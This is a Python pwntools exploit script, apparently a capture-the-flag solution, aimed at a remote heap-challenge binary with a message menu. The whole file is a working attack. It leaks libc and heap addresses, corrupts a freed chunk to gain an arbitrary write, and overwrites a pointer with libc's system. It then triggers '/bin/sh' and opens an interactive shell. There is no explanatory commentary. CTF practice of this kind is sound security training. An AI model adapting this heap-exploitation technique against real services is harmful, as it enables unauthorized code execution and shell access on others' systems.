from pwn import *
#context.log_level='debug'
def set_id(c=69):
	p.sendlineafter("id?\n",str(c))
def cmd(c):
	p.sendlineafter(">",str(c))
def add(size,c,tp=2):
	cmd(1)
	cmd(tp)
	cmd(size)
	p.sendafter("message: ",c)
def free(idx):
	cmd(2)
	p.sendlineafter("remove: ",str(idx))
def show():
	cmd(3)
def edit(idx,c):
	cmd(4)
	p.sendlineafter("edit\n",str(idx))
	p.sendlineafter("message\n",c)
#p=process("./pwnable")#,env={'LD_PRELOAD':"./libc"})
p=remote("stack.overflow.fail",9004)
set_id(255)
add(0x87,"A\n")
add(0x17,"B\n")
free(0)
add(8,"\x0a")
p.readuntil("message is: ")
base=(u64(p.readline()[:-1].ljust(8,'\x00'))^0xffffffffffff)-(0x00007f9dbe3d000a-0x00007f9dbe010000)
log.warning(hex(base))
#
libc=ELF("./pwnable").libc
libc.address=base

add(0x17,"\xff\xff\xff\xff\xff\xff\n")#2
free(2)
free(1)

add(0x17,"\n")#1
p.readuntil("message is: ")
heap=(u64(p.readline()[:-1].ljust(8,'\x00'))^0xffffffff)-(0x60000a-0x603000)#gailv
log.warning(hex(heap))

add(0x27,"C\n")#2
add(0x27,"C\n")#3
add(0x27,"C\n")#4
add(0x17,"C\n")#5

add(0x80,"A"+"\n")#6
add(0x37,"C\n")#7
add(0x37,"C\n")#8
free(2)
edit(2,p64(0x603510-0x603000+heap))
add(0x27,"AAAAAA"+'\n')#2
free(2)

add(0x27,p64(heap)*2+p64(libc.symbols['system'])+'\n')#2

#gdb.attach(p,'b *0x000000000400A69')
edit(8,"/bin/sh\x00\n")
one=base+0xf1147


p.interactive()
